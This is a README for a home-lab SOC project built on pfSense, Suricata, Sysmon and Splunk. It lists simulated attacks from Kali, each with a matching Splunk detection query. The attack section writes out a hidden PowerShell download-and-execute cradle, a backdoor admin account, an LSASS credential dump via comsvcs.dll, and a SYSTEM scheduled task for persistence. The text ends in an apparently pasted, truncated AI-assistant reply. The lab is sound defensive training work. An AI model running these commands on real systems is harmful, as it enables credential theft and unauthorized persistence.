# Corporate-Grade SOC Home Lab & Adversarial Simulation

##  Project Overview
This repository documents the architecture, configuration, and execution of a multinode **SOC Monitoring & Threat Hunting Home Lab**. The core objective of this project is to simulate an enterprise-grade perimeter defense matrix using **pfSense** to isolate logical environments, execute standard adversarial playbooks from a dedicated attack framework (**Kali Linux**), and collect/analyze security telemetry inside a centralized **Splunk SIEM** platform via **Sysmon** and native Windows event pipelines.

---

##  Network Architecture
The network infrastructure is built inside an isolated virtual hypervisor environment (**VirtualBox**) using internal networking zones to prevent lateral movement to the home production environment. 

### Subnet Allocation Matrix

| Interface | Virtual Name | Assigned Subnet | Operational Objective |
| :--- | :--- | :--- | :--- |
| `em0` | **WAN** | DHCP (External) | Outbound package downloads & system updates |
| `em1` | **SIEM** | `192.168.10.0/24` | Monitoring ingestion tier (Splunk Web UI / Collectors) |
| `em2` | **DMZ** | `192.168.20.0/24` | Public exposure perimeter (Target Windows Node / Network Tap) |
| `em3` | **APPS** | `192.168.30.0/24` | Microservices runtime and container architecture hosting |
| `em4` | **ATTACKER**| `192.168.40.0/24` | Red Team execution zone (Kali Linux platform) |

---

## 🛡️ Defenses and Infrastructure Configuration

### 1. pfSense Firewall Traffic Isolation Rules
By default, pfSense blocks all traffic between newly assigned interfaces. To allow secure testing boundaries, the following hierarchical rule priorities were configured:
*   **ATTACKER Interface:** Implements an explicit **Block** rule to destination `SIEM net` followed by a catch-all **Pass** rule to destination `Any`. This guarantees the attack node can touch the DMZ targets and fetch tools from the internet, but can never move laterally into the secure monitoring environment.
*   **DMZ / APPS Interfaces:** Configured with strict internal zoning blocking access to the `192.168.10.0/24` network while permitting return packets and normal internal visibility.
*   **Suricata Integration:** Deployed the `suricata` package directly onto pfSense interfaces. Integrated the **ETOpen Free Emerging Threats** signature catalog, binding monitoring tasks to the `DMZ` and `ATTACKER` networks to output JSON alerts into standard logs.

### 2. Telemetry Ingestion Pipeline (Splunk Forwarding)
*   **Network Events:** Configured `System > System Logs > Settings` on pfSense to pass all local logs and Suricata alerts across subnets over **UDP Port 514** straight to the Splunk node.
*   **Host Events:** Windows targets run **Sysmon (System Monitor)** with custom modular configurations alongside the native Windows Security Log framework to monitor high-fidelity telemetry markers like process spawning, network sockets, and privilege modifications.

---

## ⚔️ Adversarial Simulation Playbook & Detection Blueprints

Here are the details for the simulated attacks launched from the Kali node using `Evil-WinRM` to compromise the target Windows server (`192.168.20.4`), complete with matching Splunk hunting telemetry expressions.

### Adversarial Mapping Matrix

| # | Attack Strategy | MITRE ATT&CK ID | Target Event Data Source | Kill Chain Phase |
| :-: | :--- | :--- | :--- | :--- |
| **4** | PowerShell Malicious Execution | **T1059.001** | Sysmon Event ID 1 (Process Creation) | Execution |
| **5** | Local Account Generation | **T1136.001** | Security Event ID 4720 / Sysmon ID 1 | Persistence |
| **6** | Credential Dumping (LSASS) | **T1003.001** | Sysmon Event ID 10 (Process Access) | Credential Access |
| **7** | Scheduled Task Engineering | **T1053.005** | Security Event ID 4698 / Sysmon ID 1 | Persistence |

---

### 📂 Attack Breakdown & SIEM Validation Verification

#### Attack #4: PowerShell Malicious Execution (`T1059.001`)
*   **Simulation Vector:** Execution of a hidden web client payload delivery cradle simulating runtime extraction of malicious tools.
*   **Execution String:**
    ```powershell
    powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0')"
    ```
*   **Splunk Detection Expression:**
    ```text
    index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 "powershell.exe"
    | table _time, Computer, User, CommandLine, ParentCommandLine
    ```

#### Attack #5: Local Account Generation (`T1136.001`)
*   **Simulation Vector:** Unauthorized configuration of an administrative access persistence back-channel account.
*   **Execution String:**
    ```powershell
    net user hacker_admin MaliciousPass123! /add
    net localgroup administrators hacker_admin /add
    ```
*   **Splunk Detection Expression:**
    ```text
    index=windows sourcetype="XmlWinEventLog:Security" EventCode=4720 
    | rename TargetUserName as CreatedUser, SubjectUserName as ThreatActor
    | table _time, Computer, ThreatActor, CreatedUser
    ```

#### Attack #6: Credential Dumping via LSASS Memory (`T1003.001`)
*   **Simulation Vector:** Interrogating memory states inside the `lsass.exe` mechanism utilizing the native Windows service subsystem wrapper (`comsvcs.dll`) to forge an internal minidump copy.
*   **Execution String:**
    ```powershell
    # Query target PID first, then inject into execution string
    Get-Process lsass
    rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> c:\windows\temp\lsass.dmp full
    ```
*   **Splunk Detection Expression:**
    ```text
    index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10 TargetImage="C:\\Windows\\system32\\lsass.exe"
    | table _time, Computer, SourceImage, GrantedAccess, SourceCommandLine
    ```

#### Attack #7: Scheduled Task Engineering (`T1053.005`)
*   **Simulation Vector:** Generating persistent, escalated runtime triggers inside the Windows Task Scheduler system configured to invoke malicious routines periodically under elevated system permissions.
*   **Execution String:**
    ```powershell
    schtasks /create /tn "MaliciousPersistence" /tr "cmd.exe /c echo 'Backdoor Active'" /sc daily /st 12:00 /ru "SYSTEM"
    ```
*   **Splunk Detection Expression:**
    ```text
    index=windows sourcetype="XmlWinEventLog:Security" EventCode=4698
    | xmlkv Message
    | table _time, Computer, TaskName, Command
    ```

---

## 🛠️ Lab Troubleshooting Guide

### ⚠️ Syslog Forwarding or Pings Failing Between Segments
1. **Windows Local Firewall:** Windows natively drops incoming ICMP and remote pipeline threads arriving from alternate subnet masks. Ensure **Windows Defender Firewall** profiles are explicitly disabled or adjusted via the Control Panel to permit cross-zone traffic.
2. **WinRM Profile Incompatibility:** If `winrm quickconfig` fails with errors about connection scopes, the operating system interface profile is stuck on "Public". Rectify this by using an Administrator PowerShell terminal to change it to "Private":
   ```powershell
   Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private
   Enable-PSRemoting -Force
   ```

### ⚠️ Splunk Search Dispatch Error: "Minimum Free Disk Space Reached"
If Splunk locks search indexing mechanisms due to local VM constraints (`/opt/splunk/var/run/splunk/dispatch` exhaustion), execute a manual cache purge using an active terminal session on the Ubuntu SIEM machine:
```bash
sudo /opt/splunk/bin/splunk stop
sudo rm -rf /opt/splunk/var/run/splunk/dispatch/*
sudo apt-get clean && sudo apt-get autoremove -y
sudo journalctl --vacuum-time=2d
sudo /opt/splunk/bin/splunk start
```
If you want to make this repository stand out to recruiters, let me know if you would like me to draft:A markdown architecture setup section detailing your exact VirtualBox adapt
